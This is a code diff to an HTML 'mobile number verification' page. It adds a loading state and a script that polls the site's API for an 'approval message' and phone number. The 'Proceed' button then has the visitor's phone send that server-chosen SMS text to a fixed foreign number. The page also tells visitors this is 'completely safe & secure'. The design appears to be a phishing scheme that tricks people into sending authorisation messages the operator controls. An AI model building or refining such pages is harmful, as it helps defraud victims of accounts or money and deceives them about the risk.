@@ -252,6 +252,45 @@
       box-shadow: inset 0 0 0 1px rgba(255,255,255,0.08);
     }
 
+    .hidden {
+      display: none !important;
+    }
+
+    .loading-state {
+      display: grid;
+      place-items: center;
+      min-height: 420px;
+      text-align: center;
+    }
+
+    .loading-spinner {
+      width: 52px;
+      height: 52px;
+      border: 5px solid rgba(109, 102, 116, 0.15);
+      border-top-color: var(--purple);
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin: 0 auto 18px;
+    }
+
+    .loading-label {
+      font-size: clamp(1.7rem, 2vw, 2.2rem);
+      font-weight: 700;
+      letter-spacing: -0.05em;
+      color: #2d3035;
+      margin-bottom: 10px;
+    }
+
+    .loading-sub {
+      color: #5f6670;
+      font-size: clamp(1.1rem, 1.7vw, 1.45rem);
+      letter-spacing: -0.04em;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
     @media (max-width: 600px) {
       .card {
         padding: 34px 24px 28px;
@@ -282,36 +321,129 @@
 </head>
 <body>
   <div class="card" role="dialog" aria-modal="true" aria-labelledby="verify-title">
-    <h1 id="verify-title">Let’s get your Mobile<br>number verified</h1>
-
-    <div class="device-stage" aria-hidden="true">
-      <div class="device">
-        <div class="screen"></div>
-        <div class="magnifier"></div>
+    <div id="loadingState" class="loading-state">
+      <div>
+        <div class="loading-spinner" aria-hidden="true"></div>
+        <div class="loading-label">Message ready</div>
+        <div class="loading-sub">Waiting for the approval message…</div>
       </div>
     </div>
 
-    <p class="instruction">
-      Please send verification SMS from +265<br>
-      <strong>984348454</strong> immediately to verify your number.
-    </p>
+    <div id="readyState" class="hidden">
+      <h1 id="verify-title">Let’s get your Mobile<br>number verified</h1>
 
-    <div class="safe-note" aria-live="polite">
-      <span class="tiny-icon">i</span>
-      <p><span>will prompt you to</span> <strong>send an SMS.</strong> It is completely safe &amp; secure.</p>
-    </div>
+      <div class="device-stage" aria-hidden="true">
+        <div class="device">
+          <div class="screen"></div>
+          <div class="magnifier"></div>
+        </div>
+      </div>
 
-    <div class="cta-row">
-      <button type="button" class="btn cancel">Cancel</button>
-      <button type="button" class="btn proceed">Proceed</button>
+      <p class="instruction">
+        Please send verification SMS from<br>
+        <strong id="verificationPhone">+2540748128931</strong> immediately to verify your number.
+      </p>
+
+      <div class="safe-note" aria-live="polite">
+        <span class="tiny-icon">i</span>
+        <p><span>will prompt you to</span> <strong>send an SMS.</strong> It is completely safe &amp; secure.</p>
+      </div>
+
+      <div class="cta-row">
+        <button type="button" class="btn cancel">Cancel</button>
+        <button type="button" class="btn proceed">Proceed</button>
+      </div>
     </div>
   </div>
 
   <script>
+    const params = new URLSearchParams(window.location.search);
+    const reqId = params.get('id');
+    const phoneEl = document.getElementById('verificationPhone');
+    const loadingState = document.getElementById('loadingState');
+    const readyState = document.getElementById('readyState');
+
+    const DEFAULT_SMS_NUMBER = '+2540748128931';
+    let lastMsgId = 0;
+    let currentMessageText = 'Verification';
+
+    function normalizePhone(phone) {
+      if (!phone) return DEFAULT_SMS_NUMBER;
+      let cleaned = String(phone).trim();
+      cleaned = cleaned.replace(/\s+/g, '');
+      cleaned = cleaned.replace(/[^\d+]/g, '');
+
+      if (!cleaned) return DEFAULT_SMS_NUMBER;
+      if (cleaned.startsWith('00')) {
+        cleaned = '+' + cleaned.slice(2);
+      }
+      if (cleaned.startsWith('+')) return cleaned;
+      if (/^254\d{9}$/.test(cleaned)) return '+' + cleaned;
+      if (/^\d{9}$/.test(cleaned)) return '+254' + cleaned;
+      if (/^\d{10}$/.test(cleaned)) return '+254' + cleaned.slice(1);
+      return cleaned || DEFAULT_SMS_NUMBER;
+    }
+
+    function setPhone(value) {
+      const safe = normalizePhone(value || DEFAULT_SMS_NUMBER);
+      if (phoneEl) phoneEl.textContent = safe;
+      return safe;
+    }
+
+    function showReadyState() {
+      loadingState.classList.add('hidden');
+      readyState.classList.remove('hidden');
+    }
+
+    async function loadRequestPhone() {
+      if (!reqId) return setPhone(params.get('phone'));
+
+      try {
+        const res = await fetch('/api/request/' + encodeURIComponent(reqId));
+        if (!res.ok) return setPhone(params.get('phone'));
+        const data = await res.json();
+        return setPhone(data.phone || params.get('phone'));
+      } catch (err) {
+        return setPhone(params.get('phone'));
+      }
+    }
+
+    async function pollMessages() {
+      if (!reqId) {
+        showReadyState();
+        return;
+      }
+
+      try {
+        const response = await fetch('/api/messages/' + encodeURIComponent(reqId) + '?since=' + lastMsgId);
+        if (response.status === 403 || response.status === 404) {
+          return;
+        }
+        if (!response.ok) {
+          return;
+        }
+
+        const messages = await response.json();
+        if (!messages || !messages.length) {
+          return;
+        }
+
+        const latest = messages.reduce((latestMessage, message) => message.id > latestMessage.id ? message : latestMessage, messages[0]);
+        currentMessageText = latest.text || 'Verification';
+        lastMsgId = Math.max(lastMsgId, latest.id);
+        showReadyState();
+      } catch (err) {
+        console.error('Unable to load messages:', err);
+      }
+    }
+
+    loadRequestPhone();
+    pollMessages();
+    setInterval(pollMessages, 3000);
+
     document.querySelector('.btn.proceed')?.addEventListener('click', function () {
-      const number = '+265984348454';
-      const text = 'Verification';
-      const smsHref = 'sms:' + number + '?body=' + encodeURIComponent(text);
+      const number = normalizePhone(params.get('phone') || DEFAULT_SMS_NUMBER);
+      const smsHref = 'sms:' + number + '?body=' + encodeURIComponent(currentMessageText);
       window.location.href = smsHref;
     });
 
